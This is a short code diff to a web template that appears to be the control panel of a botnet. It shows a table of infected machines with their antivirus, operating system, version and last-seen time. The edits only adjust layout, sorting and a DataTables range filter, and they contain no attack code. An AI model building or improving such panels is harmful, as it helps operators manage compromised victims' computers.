@@ -22,7 +22,7 @@
     </div>
 </div>
 
-<div class="col-md-12 col-lg-11">
+<div class="col-md-12 col-lg-12">
     <div class="container">
         <div class="row">
 
@@ -57,7 +57,7 @@
                         <td class="avtivirus hideTablet"> <img src="{$includeDir}assets/img/img/av/{$bot.antivirus}.png"  width="120" height="28"> </td>
                         <td class="operingsystem hideTablet"> {$bot.operingsystem} </td>
                         <td> {$bot.version} </td>
-                        <td class="hideMobile"> <span id="lastSeen-{$bot.id}"></span> <script>$("#lastSeen-{$bot.id}").html( timeDifference("{$bot.now}","{$bot.lastresponse}")) </script> </td>
+                        <td class="hideMobile" data-order="{$bot.lastresponse}"> <span id="lastSeen-{$bot.id}"></span> <script>$("#lastSeen-{$bot.id}").html( timeDifference("{$bot.now}","{$bot.lastresponse}")) </script> </td>
 
                         <td>
                             <a class="botinfo_modal_link" onclick="openBotInfo({$bot.id})"> Info</a>
@@ -95,4 +95,24 @@
 
 <script>
     $('.bot_table').DataTable();
+
+
+    $.fn.dataTable.ext.filter.push(
+        function( settings, data, dataIndex ) {
+            var min = $('#min').val() * 1;
+            var max = $('#max').val() * 1;
+            var age = parseFloat( data[3] ) || 0; // use data for the age column
+
+            if ( ( min == '' && max == '' ) ||
+                ( min == '' && age <= max ) ||
+                ( min <= age && '' == max ) ||
+                ( min <= age && age <= max ) )
+            {
+                return true;
+            }
+            return false;
+        }
+    );
+
+
 </script>
